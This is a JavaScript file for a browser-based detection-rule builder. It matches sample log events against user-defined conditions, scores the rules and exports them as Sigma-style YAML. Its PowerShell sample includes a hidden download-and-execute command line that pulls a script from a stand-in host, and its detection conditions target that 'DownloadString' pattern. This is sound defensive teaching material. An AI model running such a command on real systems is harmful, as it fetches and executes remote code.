const $ = (id) => document.getElementById(id);

const samples = {
  powershell: [
    '{"time":"2026-05-25T10:14:12Z","host":"WIN-CLIENT-01","username":"nguyen","eventType":"process_start","process":"powershell.exe","commandLine":"powershell.exe -nop -w hidden IEX (New-Object Net.WebClient).DownloadString(\\"http://example.test/a.ps1\\")","sourceIp":"10.0.1.25"}',
    '{"time":"2026-05-25T10:15:42Z","host":"WIN-CLIENT-02","username":"maya","eventType":"process_start","process":"powershell.exe","commandLine":"powershell.exe Get-Process","sourceIp":"10.0.1.26"}',
    '{"time":"2026-05-25T10:17:03Z","host":"WIN-CLIENT-03","username":"sam","eventType":"process_start","process":"cmd.exe","commandLine":"cmd.exe /c whoami","sourceIp":"10.0.1.27"}'
  ].join("\n"),
  cloud: [
    '{"time":"2026-05-25T11:01:00Z","username":"admin@example.com","eventType":"console_login","sourceIp":"203.0.113.50","action":"success","country":"Unknown"}',
    '{"time":"2026-05-25T11:03:20Z","username":"svc-backup","eventType":"api_call","action":"CreateAccessKey","sourceIp":"10.4.2.8"}',
    '{"time":"2026-05-25T11:04:10Z","username":"admin@example.com","eventType":"api_call","action":"DeleteTrail","sourceIp":"203.0.113.50"}'
  ].join("\n")
};

let conditions = [
  { field: "process", operator: "contains", value: "powershell" },
  { field: "commandLine", operator: "contains", value: "DownloadString" }
];

let lastResult = null;

function init() {
  bindEvents();
  loadSample("powershell");
  renderConditions();
  renderOutput();
  updateMetrics([], 0, "Untested", "Add conditions and test the rule to see coverage and tuning guidance.");
}

function bindEvents() {
  $("loadSample").addEventListener("click", () => loadSample("powershell"));
  $("loadPowerShell").addEventListener("click", () => loadSample("powershell"));
  $("loadCloud").addEventListener("click", () => {
    $("ruleName").value = "Suspicious Cloud Admin Action";
    $("logSource").value = "cloud";
    $("conditionField").value = "action";
    conditions = [
      { field: "eventType", operator: "equals", value: "api_call" },
      { field: "action", operator: "contains", value: "Delete" }
    ];
    loadSample("cloud");
    renderConditions();
    renderOutput();
  });
  $("resetRule").addEventListener("click", resetRule);
  $("addCondition").addEventListener("click", addCondition);
  $("testRule").addEventListener("click", testRule);
  $("exportRule").addEventListener("click", exportRule);
  ["ruleName", "logSource", "severity", "logicMode"].forEach((id) => {
    $(id).addEventListener("input", renderOutput);
    $(id).addEventListener("change", renderOutput);
  });
}

function loadSample(type) {
  $("eventInput").value = samples[type];
  $("ruleBadge").textContent = type === "cloud" ? "Cloud sample" : "PowerShell sample";
}

function addCondition() {
  const value = $("conditionValue").value.trim();
  if (!value) return;
  conditions.push({
    field: $("conditionField").value,
    operator: $("conditionOperator").value,
    value
  });
  $("conditionValue").value = "";
  renderConditions();
  renderOutput();
}

function removeCondition(index) {
  conditions.splice(index, 1);
  renderConditions();
  renderOutput();
}

function renderConditions() {
  const list = $("conditionList");
  const template = $("conditionTemplate");
  list.innerHTML = "";

  if (!conditions.length) {
    list.innerHTML = `<div class="empty-state">No conditions yet. Add at least one field check to make the rule meaningful.</div>`;
  }

  conditions.forEach((condition, index) => {
    const node = template.content.cloneNode(true);
    node.querySelector("strong").textContent = `${condition.field} ${labelForOperator(condition.operator)} ${condition.value}`;
    node.querySelector("p").textContent = explainCondition(condition);
    node.querySelector("button").addEventListener("click", () => removeCondition(index));
    list.appendChild(node);
  });

  $("conditionCount").textContent = conditions.length;
}

function testRule() {
  const events = parseEvents($("eventInput").value);
  const matches = events.filter((event) => eventMatches(event));
  const quality = scoreQuality(events, matches);
  const verdict = verdictFor(quality, matches.length, events.length);
  const summary = summaryFor(events, matches, quality);
  lastResult = { events, matches, quality, verdict, summary };
  renderMatches(matches);
  updateMetrics(matches, quality, verdict, summary);
  renderOutput();
}

function parseEvents(raw) {
  return raw
    .split(/\r?\n/)
    .map((line) => line.trim())
    .filter(Boolean)
    .map((line, index) => {
      try {
        return { id: index + 1, ...JSON.parse(line) };
      } catch {
        return parseKeyValueLine(line, index + 1);
      }
    });
}

function parseKeyValueLine(line, id) {
  const event = { id, raw: line };
  line.split(/\s+/).forEach((part) => {
    const [key, ...valueParts] = part.split("=");
    if (key && valueParts.length) event[key] = valueParts.join("=");
  });
  return event;
}

function eventMatches(event) {
  if (!conditions.length) return false;
  const checks = conditions.map((condition) => conditionMatches(event, condition));
  return $("logicMode").value === "all" ? checks.every(Boolean) : checks.some(Boolean);
}

function conditionMatches(event, condition) {
  const actual = String(event[condition.field] ?? "").toLowerCase();
  const expected = String(condition.value).toLowerCase();
  if (condition.operator === "equals") return actual === expected;
  if (condition.operator === "startsWith") return actual.startsWith(expected);
  if (condition.operator === "endsWith") return actual.endsWith(expected);
  return actual.includes(expected);
}

function scoreQuality(events, matches) {
  let score = 25;
  if (conditions.length >= 2) score += 20;
  if (conditions.length >= 3) score += 8;
  if ($("logicMode").value === "all") score += 12;
  if (matches.length > 0) score += 20;
  if (events.length && matches.length < events.length) score += 12;
  if (matches.length === events.length && events.length > 1) score -= 18;
  if (conditions.some((condition) => condition.operator === "equals")) score += 6;
  if ($("severity").value === "critical" && conditions.length < 2) score -= 10;
  return clamp(score, 0, 100);
}

function verdictFor(score, matches, total) {
  if (!total) return "Untested";
  if (!matches) return "Too narrow";
  if (score >= 78) return "Strong";
  if (score >= 55) return "Useful";
  return "Needs tuning";
}

function summaryFor(events, matches, quality) {
  if (!events.length) return "Add test events before judging this rule.";
  if (!conditions.length) return "Add conditions so the rule can describe suspicious behavior.";
  if (!matches.length) return "No events matched. The rule may be too narrow, or your test data may not contain the behavior.";
  if (matches.length === events.length && events.length > 1) return "Every event matched. The rule may be too broad and could create noisy alerts.";
  if (quality >= 78) return "This is a strong starter rule: it has multiple conditions, matching test data, and some separation from benign events.";
  return "This rule is usable for learning. Add more conditions or benign test events to tune false positives.";
}

function updateMetrics(matches, quality, verdict, summary) {
  $("matchCount").textContent = matches.length;
  $("matchBadge").textContent = `${matches.length} matches`;
  $("qualityScore").textContent = quality;
  $("qualityValue").textContent = quality;
  $("scoreFill").style.width = `${quality}%`;
  $("summaryBox").textContent = summary;
  $("qualityBadge").textContent = verdict;
  $("qualityBadge").className = `verdict ${classForVerdict(verdict)}`;
}

function renderMatches(matches) {
  const list = $("matchList");
  const template = $("matchTemplate");
  list.innerHTML = "";

  if (!matches.length) {
    list.innerHTML = `<div class="empty-state">No events matched this rule.</div>`;
    return;
  }

  matches.forEach((event) => {
    const node = template.content.cloneNode(true);
    node.querySelector("strong").textContent = event.host || event.username || `Event ${event.id}`;
    node.querySelector("p").textContent = event.commandLine || event.action || event.raw || JSON.stringify(event);
    node.querySelector("small").textContent = `Matched event ${event.id}`;
    list.appendChild(node);
  });
}

function renderOutput() {
  $("conditionCount").textContent = conditions.length;
  $("ruleOutput").textContent = buildSigmaRule();
}

function buildSigmaRule() {
  const title = $("ruleName").value.trim() || "Custom Security Rule";
  const id = slugify(title);
  const source = $("logSource").value;
  const severity = $("severity").value;
  const logic = $("logicMode").value === "all" ? "all of selection_*" : "1 of selection_*";
  const lines = [
    `title: ${title}`,
    `id: local-${id}`,
    "status: experimental",
    "description: Starter detection rule generated for learning and tuning.",
    "logsource:",
    `  product: ${source}`,
    "detection:"
  ];

  conditions.forEach((condition, index) => {
    lines.push(`  selection_${index + 1}:`);
    lines.push(`    ${sigmaField(condition)}: ${quoteYaml(condition.value)}`);
  });

  lines.push(`  condition: ${logic}`);
  lines.push(`level: ${severity}`);
  lines.push("falsepositives:");
  lines.push("  - Administrative activity or expected automation using similar fields");
  lines.push("fields:");
  fieldsUsed().forEach((field) => lines.push(`  - ${field}`));
  return lines.join("\n");
}

function sigmaField(condition) {
  if (condition.operator === "contains") return `${condition.field}|contains`;
  if (condition.operator === "startsWith") return `${condition.field}|startswith`;
  if (condition.operator === "endsWith") return `${condition.field}|endswith`;
  return condition.field;
}

function exportRule() {
  const body = [
    "# Custom Security Rule",
    "",
    "## Plain English",
    explainRule(),
    "",
    "## Starter Sigma-Style Rule",
    "```yaml",
    buildSigmaRule(),
    "```",
    "",
    "## Test Result",
    lastResult ? `Matched ${lastResult.matches.length} of ${lastResult.events.length} event(s). Quality score: ${lastResult.quality}.` : "Rule has not been tested yet."
  ].join("\n");
  const blob = new Blob([body], { type: "text/markdown" });
  const url = URL.createObjectURL(blob);
  const anchor = document.createElement("a");
  anchor.href = url;
  anchor.download = `${slugify($("ruleName").value || "custom-rule")}.md`;
  anchor.click();
  URL.revokeObjectURL(url);
}

function explainRule() {
  const logic = $("logicMode").value === "all" ? "all conditions" : "any condition";
  const conditionText = conditions.map((condition) => `${condition.field} ${labelForOperator(condition.operator)} "${condition.value}"`).join("; ");
  return `Alert when ${logic} match: ${conditionText || "no conditions yet"}. Severity is ${$("severity").value}.`;
}

function resetRule() {
  $("ruleName").value = "Suspicious PowerShell Download";
  $("logSource").value = "windows";
  $("severity").value = "high";
  $("logicMode").value = "all";
  conditions = [
    { field: "process", operator: "contains", value: "powershell" },
    { field: "commandLine", operator: "contains", value: "DownloadString" }
  ];
  lastResult = null;
  loadSample("powershell");
  renderConditions();
  renderMatches([]);
  updateMetrics([], 0, "Untested", "Add conditions and test the rule to see coverage and tuning guidance.");
  renderOutput();
}

function fieldsUsed() {
  return [...new Set(["time", "host", "username", ...conditions.map((condition) => condition.field)])];
}

function explainCondition(condition) {
  return `This checks whether the event field named ${condition.field} ${labelForOperator(condition.operator)} the value "${condition.value}".`;
}

function labelForOperator(operator) {
  if (operator === "startsWith") return "starts with";
  if (operator === "endsWith") return "ends with";
  if (operator === "equals") return "equals";
  return "contains";
}

function classForVerdict(verdict) {
  if (verdict === "Strong") return "low";
  if (verdict === "Useful") return "medium";
  if (verdict === "Needs tuning") return "high";
  if (verdict === "Too narrow") return "critical";
  return "neutral";
}

function quoteYaml(value) {
  return `"${String(value).replace(/"/g, '\\"')}"`;
}

function slugify(value) {
  return String(value).toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "") || "custom-rule";
}

function clamp(value, min, max) {
  return Math.max(min, Math.min(max, value));
}

init();
